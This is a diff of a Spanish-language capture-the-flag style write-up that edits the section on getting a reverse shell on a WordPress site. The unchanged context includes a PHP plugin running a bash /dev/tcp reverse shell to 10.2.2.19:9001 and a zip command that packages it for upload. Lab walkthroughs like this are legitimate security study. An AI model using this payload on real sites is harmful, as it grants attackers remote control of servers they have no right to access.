@@ -276,7 +276,7 @@ realizamos un escaneo con gobuster y encontramos el directorio `/loging`
 
 ### Getting a revershell
 
-Una vez que tenemos acceso tendremos que obtener una revershell, esto con ayuda de  [reverse-shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell). Para esto tendremos el cargar un plugin malicioso que contenga una revershell. modificaremos dirección IP y puerto, luego comprimiéremos este archivo en un `.zip` para subir como plugin
+Una vez que tenemos acceso tendremos que obtener una revershell, esto con ayuda de  [reverse-shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell). Para esto tendremos el cargar un plugin malicioso que contenga una revershell. apuntando a nuestra dirección IP y puerto, luego comprimiéremos este archivo en un `.zip` para subir como plugin
 
 ```python
 <?php
@@ -292,10 +292,10 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.2.19/9001 0>&1'");
 ?>
 ```
 
-Vamos a comprimir el archivo.
+comprimir el archivo.
 
 ```c
-❯ zip revershell.zip revershell.php
+❯ zip shell.zip revershell.php
   adding: revershell.php (deflated 28%)
 ```
 
